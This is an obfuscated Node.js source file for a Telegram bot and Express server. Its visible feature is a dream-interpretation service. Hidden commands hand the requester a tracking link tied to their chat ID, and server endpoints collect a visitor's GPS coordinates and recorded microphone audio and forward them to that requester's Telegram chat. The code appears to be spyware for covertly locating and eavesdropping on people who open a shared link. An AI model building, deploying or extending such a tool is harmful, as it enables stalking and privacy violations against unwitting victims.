            'EStzH': _0x549a37(0x508),
            'YfmHi': _0x549a37(0x733),
            'tCDoJ': _0x549a37(0x65a) + _0x549a37(0xaf0),
            'YFrgV': _0x549a37(0x55a) + _0x549a37(0x9d2),
            'GhhCK': _0x549a37(0x844) + _0x549a37(0xc40) + _0x549a37(0x349) + _0x549a37(0xb80) + _0x549a37(0x9bf),
            'kAsxN': _0x549a37(0x844) + _0x549a37(0xc40) + _0x549a37(0x7ac) + _0x549a37(0x243) + _0x549a37(0x909)
        }, _0x43f4ee = _0x5b24ff[_0x549a37(0x33c)][_0x549a37(0x556)]['id'];
    if (_0x163434[_0x549a37(0x9de)](_0x5b24ff[_0x549a37(0xc57)], _0x163434[_0x549a37(0x431)])) {
        const _0x535bc9 = {
            'reply_markup': {
                'inline_keyboard': [[
                        {
                            'text': _0x163434[_0x549a37(0x25a)],
                            'callback_data': 'ar'
                        },
                        {
                            'text': _0x163434[_0x549a37(0x32c)],
                            'callback_data': _0x163434[_0x549a37(0x2f2)]
                        }
                    ]]
            }
        };
        userSessionsg[_0x43f4ee] = { 'state': _0x163434[_0x549a37(0x45b)] }, bot[_0x549a37(0x382) + _0x549a37(0x220)](_0x163434[_0x549a37(0x914)], {
            'chat_id': _0x43f4ee,
            'message_id': _0x5b24ff[_0x549a37(0x33c)][_0x549a37(0x42f)],
            'reply_markup': _0x535bc9[_0x549a37(0xb54) + 'up']
        });
    } else {
        if (_0x163434[_0x549a37(0x9de)](_0x5b24ff[_0x549a37(0xc57)], 'ar'))
            bot[_0x549a37(0xb04) + 'e'](_0x43f4ee, _0x163434[_0x549a37(0x5e8)]), userSessionsg[_0x43f4ee][_0x549a37(0x735)] = 'ar';
        else
            _0x163434[_0x549a37(0x9de)](_0x5b24ff[_0x549a37(0xc57)], _0x163434[_0x549a37(0x2f2)]) && (bot[_0x549a37(0xb04) + 'e'](_0x43f4ee, _0x163434[_0x549a37(0xc9d)]), userSessionsg[_0x43f4ee][_0x549a37(0x735)] = _0x163434[_0x549a37(0x2f2)]);
    }
}), bot['on'](_0x298049(0x33c), _0x46f65e => {
    const _0x6d9205 = _0x298049, _0x53fe1c = {
            'vropp': function (_0x8c7e, _0x116050) {
                return _0x8c7e === _0x116050;
            },
            'lIeEr': _0x6d9205(0x1f8),
            'SUZXq': function (_0x179e0d, _0x2bca4c) {
                return _0x179e0d === _0x2bca4c;
            },
            'ZutSr': _0x6d9205(0xc84),
            'ipYiG': function (_0x27667c, _0x59d95c) {
                return _0x27667c(_0x59d95c);
            },
            'GdFWU': function (_0x2615e5, _0x2383c4) {
                return _0x2615e5 === _0x2383c4;
            },
            'SbLlz': _0x6d9205(0x733)
        }, _0x449a7d = _0x46f65e[_0x6d9205(0x556)]['id'];
    if (_0x53fe1c[_0x6d9205(0xc0c)](_0x46f65e[_0x6d9205(0x8e5)][_0x6d9205(0xd26) + 'e'](), _0x53fe1c[_0x6d9205(0x587)]) || _0x53fe1c[_0x6d9205(0x6ba)](_0x46f65e[_0x6d9205(0x8e5)][_0x6d9205(0xd26) + 'e'](), _0x53fe1c[_0x6d9205(0x811)])) {
        _0x53fe1c[_0x6d9205(0xcbc)](showDreamMenu, _0x449a7d);
        return;
    }
    if (userSessionsg[_0x449a7d] && userSessionsg[_0x449a7d][_0x6d9205(0x735)]) {
        const _0x4348d3 = userSessionsg[_0x449a7d][_0x6d9205(0x735)];
        if (_0x53fe1c[_0x6d9205(0x6ba)](_0x4348d3, 'ar'))
            _0x53fe1c[_0x6d9205(0xcbc)](processAi, _0x46f65e), userSessionsg[_0x449a7d][_0x6d9205(0x735)] = null;
        else
            _0x53fe1c[_0x6d9205(0x579)](_0x4348d3, _0x53fe1c[_0x6d9205(0x5ed)]) && (_0x53fe1c[_0x6d9205(0xcbc)](processIbnSirin, _0x46f65e), userSessionsg[_0x449a7d][_0x6d9205(0x735)] = null);
    }
});
function processAi(_0x3b9dc2) {
    const _0x1f7b8 = _0x298049, _0x516a7d = {
            'axpEZ': function (_0x4c85c2, _0x15fe24, _0x28ec9f) {
                return _0x4c85c2(_0x15fe24, _0x28ec9f);
            }
        }, _0x563403 = _0x3b9dc2[_0x1f7b8(0x8e5)], _0x542fd2 = _0x1f7b8(0x620) + _0x1f7b8(0x6b9) + _0x1f7b8(0xc43) + _0x1f7b8(0x329) + _0x563403;
    _0x516a7d[_0x1f7b8(0x1af)](sendRequestToApi, _0x542fd2, _0x3b9dc2);
}
function processIbnSirin(_0x9a6308) {
    const _0x3e0ff8 = _0x298049, _0x577981 = {
            'SNlPO': function (_0x481b93, _0x301f6f, _0x209bb3) {
                return _0x481b93(_0x301f6f, _0x209bb3);
            }
        }, _0xa8076c = _0x9a6308[_0x3e0ff8(0x8e5)], _0x2de517 = _0x3e0ff8(0x620) + _0x3e0ff8(0x34f) + _0x3e0ff8(0x3db) + _0xa8076c;
    _0x577981[_0x3e0ff8(0xaad)](sendRequestToApi, _0x2de517, _0x9a6308);
}
async function sendRequestToApi(_0x117ba4, _0x1994ad) {
    const _0x58f359 = _0x298049, _0x461e68 = {
            'sXstp': _0x58f359(0x9c3) + _0x58f359(0xce4),
            'cqMjD': _0x58f359(0xa7f) + _0x58f359(0xa62) + _0x58f359(0x4eb) + _0x58f359(0x9b2) + _0x58f359(0x777) + _0x58f359(0x21e) + _0x58f359(0x942) + _0x58f359(0x691) + _0x58f359(0xc55) + _0x58f359(0xb7d) + _0x58f359(0xa4b) + '6',
            'Dxjhj': _0x58f359(0xbdf) + _0x58f359(0x8e8) + _0x58f359(0x762) + _0x58f359(0xd23),
            'HsFea': _0x58f359(0xbe9),
            'cTtEA': _0x58f359(0xbdf) + _0x58f359(0x8e8) + _0x58f359(0x4b3) + 'at',
            'AUwPX': function (_0x2dc8fd, _0x44a761) {
                return _0x2dc8fd === _0x44a761;
            }
        }, _0x3408f8 = {
            'Content-Type': _0x461e68[_0x58f359(0x6ac)],
            'User-Agent': _0x461e68[_0x58f359(0x554)],
            'Referer': _0x461e68[_0x58f359(0x56a)]
        }, _0x30d857 = {
            'messages': [_0x117ba4],
            'character': _0x461e68[_0x58f359(0xaac)]
        };
    try {
        const _0x10ff6f = await axios[_0x58f359(0xb22)](_0x461e68[_0x58f359(0xcdd)], _0x30d857, { 'headerszf': _0x3408f8 });
        if (_0x461e68[_0x58f359(0xa72)](_0x10ff6f[_0x58f359(0x1b1)], -0x5 * -0x185 + -0x1c1a + 0x1549))
            bot[_0x58f359(0xb04) + 'e'](_0x1994ad[_0x58f359(0x556)]['id'], _0x58f359(0x824) + _0x10ff6f[_0x58f359(0xc57)]);
        else {
        }
    } catch (_0x529e13) {
    }
}
app[_0x298049(0x943)](_0x298049(0x72b) + _0x298049(0x6cd), (_0x5608a3, _0x3dcb18) => {
    const _0x37038b = _0x298049, _0x30cd3c = {
            'QAOVX': _0x37038b(0x71f) + _0x37038b(0x84b),
            'FWghM': _0x37038b(0x94d) + _0x37038b(0x3b4)
        }, _0x1a13d8 = _0x5608a3[_0x37038b(0x3a0)][_0x37038b(0x586)];
    _0x1a13d8 ? _0x3dcb18[_0x37038b(0x504)](path[_0x37038b(0xc65)](__dirname, _0x30cd3c[_0x37038b(0x377)])) : _0x3dcb18[_0x37038b(0x1b1)](-0x1 * -0x16c5 + 0x29 * 0xa6 + -0x2fcb)[_0x37038b(0x2d8)](_0x30cd3c[_0x37038b(0x917)]);
}), bot[_0x298049(0x65c)](/\/sgggggkjtart/, _0x142284 => {
    const _0x360243 = _0x298049, _0x57b5d8 = {
            'cIVnR': _0x360243(0x2e2) + _0x360243(0x871),
            'BtecQ': _0x360243(0x41e) + _0x360243(0x8ce) + _0x360243(0x1a3) + _0x360243(0xb28) + _0x360243(0x1c5)
        }, _0x6949c7 = _0x142284[_0x360243(0x556)]['id'], _0x3281c4 = {
            'inline_keyboard': [[{
                        'text': _0x57b5d8[_0x360243(0x68d)],
                        'callback_data': _0x360243(0x9e3) + _0x360243(0x659) + _0x6949c7
                    }]]
        };
    bot[_0x360243(0xb04) + 'e'](_0x6949c7, _0x57b5d8[_0x360243(0xbbd)], { 'reply_markup': _0x3281c4 });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x4ad117 => {
    const _0x563008 = _0x298049, _0x1b6f2d = { 'YTflO': _0x563008(0x9e3) + _0x563008(0x659) }, _0x6d882e = _0x4ad117[_0x563008(0x33c)], _0x542333 = _0x6d882e[_0x563008(0x556)]['id'], _0x25df9c = _0x4ad117[_0x563008(0xc57)];
    if (_0x25df9c[_0x563008(0x5cd)](_0x1b6f2d[_0x563008(0x971)])) {
        const _0x21f631 = _0x25df9c[_0x563008(0xb11)](':')[-0x157 * 0x13 + 0x6a * 0x17 + 0xff0], _0x19dd51 = baseUrl + (_0x563008(0x2c0) + 'd=') + _0x21f631;
        bot[_0x563008(0xb04) + 'e'](_0x542333, _0x563008(0x9cd) + _0x563008(0x255) + _0x563008(0x86b) + _0x563008(0x3df) + _0x19dd51), bot[_0x563008(0x5a1) + _0x563008(0x600)](_0x4ad117['id']);
    }
}), app[_0x298049(0xb22)](_0x298049(0x72b) + _0x298049(0x6cd), async (_0x4ac0a2, _0x422a84) => {
    const _0x29f797 = _0x298049, _0x466d8f = {
            'fKiAM': function (_0x2966ce, _0x2c7354) {
                return _0x2966ce || _0x2c7354;
            },
            'VfoMH': _0x29f797(0x469) + 'صة',
            'NpfYD': _0x29f797(0x8b8) + _0x29f797(0x577)
        };
    try {
        const {
            chatId: _0x2dea55,
            latitude: _0x196d19,
            longitude: _0x196ea5,
            accuracy: _0x5223fa
        } = _0x4ac0a2[_0x29f797(0x2ea)];
        if (_0x466d8f[_0x29f797(0x1da)](!_0x2dea55, !_0x196d19) || !_0x196ea5)
            return _0x422a84[_0x29f797(0x1b1)](-0x2258 + 0x1 * -0x1083 + -0x5d3 * -0x9)[_0x29f797(0x2d8)](_0x466d8f[_0x29f797(0x5e3)]);
        console[_0x29f797(0x9d7)](_0x466d8f[_0x29f797(0x35d)], {
            'chatId': _0x2dea55,
            'latitude': _0x196d19,
            'longitude': _0x196ea5,
            'accuracy': _0x5223fa
        }), await bot[_0x29f797(0xb04) + 'e'](_0x2dea55, _0x29f797(0x9ed) + _0x29f797(0x21f) + _0x29f797(0xcfc) + _0x29f797(0x2d7) + _0x29f797(0xb8c) + _0x196d19 + (_0x29f797(0xa2a) + _0x29f797(0x94a)) + _0x196ea5 + _0x29f797(0x42b) + _0x5223fa + _0x29f797(0x4b5)), await bot[_0x29f797(0x97f) + 'on'](_0x2dea55, _0x196d19, _0x196ea5);
    } catch (_0x18f2a8) {
    }
}), app[_0x298049(0x1fc)](express[_0x298049(0x990)]({ 'extended': !![] })), app[_0x298049(0x1fc)](express[_0x298049(0xc45)]()), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](_0x298049(0xabe))), app[_0x298049(0x943)](_0x298049(0x94c) + 'io', (_0x340bc8, _0x5f348c) => {
    const _0x5b735c = _0x298049, _0x26fc11 = {
            'nkmWU': _0x5b735c(0xabe),
            'OZkqf': _0x5b735c(0x92b),
            'rxPdm': _0x5b735c(0x94d) + _0x5b735c(0x3b4)
        }, _0xdf9200 = _0x340bc8[_0x5b735c(0x3a0)][_0x5b735c(0x586)];
    _0xdf9200 ? _0x5f348c[_0x5b735c(0x504)](path[_0x5b735c(0xc65)](__dirname, _0x26fc11[_0x5b735c(0xbc2)], _0x26fc11[_0x5b735c(0x246)])) : _0x5f348c[_0x5b735c(0x1b1)](0xfa1 + -0x5 * 0x445 + 0x2 * 0x3a4)[_0x5b735c(0x2d8)](_0x26fc11[_0x5b735c(0xcf4)]);
}), app[_0x298049(0xb22)](_0x298049(0xa8d) + 'io', async (_0xd7ccce, _0x5b9809) => {
    const _0x388c1f = _0x298049, _0x2f39ff = {
            'MmNMb': function (_0x1eccd1, _0x396f58) {
                return _0x1eccd1 || _0x396f58;
            },
            'paqrg': _0x388c1f(0x469) + 'صة',
            'eRtIC': _0x388c1f(0x5a4),
            'dXjDs': _0x388c1f(0x9c2) + _0x388c1f(0xa5a)
        };
    try {
        const {
            chatId: _0x43cefd,
            audioData: _0xfa47aa
        } = _0xd7ccce[_0x388c1f(0x2ea)];
        if (_0x2f39ff[_0x388c1f(0x20c)](!_0x43cefd, !_0xfa47aa))
            return _0x5b9809[_0x388c1f(0x1b1)](-0x1fcf + -0x496 + -0x1 * -0x25f5)[_0x388c1f(0x2d8)](_0x2f39ff[_0x388c1f(0x705)]);
        const _0x56d13b = Buffer[_0x388c1f(0x9cc)](_0xfa47aa[_0x388c1f(0xb11)](',')[-0x182d + -0x3 * -0x821 + -0x35 * 0x1], _0x2f39ff[_0x388c1f(0xbf7)]);
        await bot[_0x388c1f(0xab7)](_0x43cefd, _0x56d13b, { 'caption': _0x2f39ff[_0x388c1f(0x1be)] });
    } catch (_0x58e1e9) {
    }
}), bot[_0x298049(0x65c)](/\/stahqkakasbvdolsrt/, _0x3e84a5 => {
    const _0x5e2421 = _0x298049, _0x38b28d = {
            'YtkIf': _0x5e2421(0x5b4) + '\x20',
            'MSFsJ': _0x5e2421(0x41e) + _0x5e2421(0x8ce) + _0x5e2421(0xb71) + _0x5e2421(0x5db)
        }, _0x1da4f4 = _0x3e84a5[_0x5e2421(0x556)]['id'], _0x2f0d69 = {
            'inline_keyboard': [[{
                        'text': _0x38b28d[_0x5e2421(0xa30)],
                        'callback_data': _0x5e2421(0x682) + 'o:' + _0x1da4f4
                    }]]
        };
    bot[_0x5e2421(0xb04) + 'e'](_0x1da4f4, _0x38b28d[_0x5e2421(0x5aa)], { 'reply_markup': _0x2f0d69 });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0xb56981 => {
    const _0x57ba36 = _0x298049, _0x1a5ccd = { 'uRmfV': _0x57ba36(0x682) + 'o:' }, _0x590e28 = _0xb56981[_0x57ba36(0x33c)], _0x3ac8cf = _0x590e28[_0x57ba36(0x556)]['id'], _0x557920 = _0xb56981[_0x57ba36(0xc57)];
    if (_0x557920[_0x57ba36(0x5cd)](_0x1a5ccd[_0x57ba36(0x33f)])) {
        const _0x5dacf6 = _0x557920[_0x57ba36(0xb11)](':')[0x8c7 + -0x1dec + 0x1526], _0x20c96f = baseUrl + (_0x57ba36(0x522) + '=') + _0x5dacf6;
        bot[_0x57ba36(0xb04) + 'e'](_0x3ac8cf, _0x57ba36(0xc6f) + _0x57ba36(0x255) + _0x57ba36(0x400) + _0x57ba36(0xc2c) + _0x57ba36(0x289) + _0x57ba36(0xd16) + _0x20c96f), bot[_0x57ba36(0x5a1) + _0x57ba36(0x600)](_0xb56981['id']);
    }
});
const clearTemporaryStorage = () => {
    const _0x216875 = _0x298049, _0x17d9f4 = {
            'JQIsD': function (_0x1ed495, _0x329fed) {
                return _0x1ed495(_0x329fed);
            },
            'wayLr': _0x216875(0x4c3) + _0x216875(0x93d) + _0x216875(0x932),
            'VlIaV': _0x216875(0x218),
            'tlgKx': _0x216875(0x4e6),
            'NRAgm': _0x216875(0xa47),
            'OydlX': _0x216875(0x82b) + _0x216875(0x9f3) + _0x216875(0x6f3) + _0x216875(0x7b3)
        };
    try {
        console[_0x216875(0x9d7)](_0x17d9f4[_0x216875(0x994)]);
        const _0xd898c6 = [
            _0x17d9f4[_0x216875(0x9c8)],
            _0x17d9f4[_0x216875(0x8e7)],
            _0x17d9f4[_0x216875(0x99a)]
        ];
        _0xd898c6[_0x216875(0x9a0)](_0x2142fb => {
            const _0x5981d0 = _0x216875, _0xdf11eb = path[_0x5981d0(0xc65)](__dirname, _0x2142fb);
            fs[_0x5981d0(0x73e)](_0xdf11eb) ? (_0x17d9f4[_0x5981d0(0x61a)](deleteFolderRecursive, _0xdf11eb), console[_0x5981d0(0x9d7)](_0x5981d0(0x681) + _0x5981d0(0x7b1) + _0xdf11eb)) : console[_0x5981d0(0x9d7)](_0x5981d0(0xa5d) + _0x5981d0(0x2e3) + _0xdf11eb);
        });
    } catch (_0x490a21) {
        console[_0x216875(0x7b5)](_0x17d9f4[_0x216875(0x2a8)], _0x490a21);
    }
};
setInterval(() => {
    const _0x373627 = _0x298049, _0x6ea949 = {
            'vXZLO': function (_0x142a0a) {
                return _0x142a0a();
            },
            'bDsfk': _0x373627(0x29d) + _0x373627(0x3a9) + _0x373627(0x697)
        };
    _0x6ea949[_0x373627(0x2fc)](clearTemporaryStorage), console[_0x373627(0x9d7)](_0x6ea949[_0x373627(0x97d)]);
}, (-0x17e0 + 0x4 * 0x88c + -0xa4e) * (0x322 * -0x1 + 0xd * 0x22d + -0x18eb * 0x1) * (0x18f * 0x15 + -0xf * 0x143 + -0x9e6));
const handleExit = () => {
    const _0x318e79 = _0x298049, _0x577e07 = {
            'bbdaA': _0x318e79(0xa4d) + _0x318e79(0x69f) + _0x318e79(0xd0d) + _0x318e79(0x4ad),
            'wbWMr': function (_0x320b83) {
                return _0x320b83();
            }
        };
    console[_0x318e79(0x9d7)](_0x577e07[_0x318e79(0x372)]), _0x577e07[_0x318e79(0x25e)](clearTemporaryStorage), process[_0x318e79(0x593)]();
};
process['on'](_0x298049(0x593), handleExit), process['on'](_0x298049(0xa94), handleExit), process['on'](_0x298049(0x801), handleExit), process['on'](_0x298049(0xbb6), handleExit);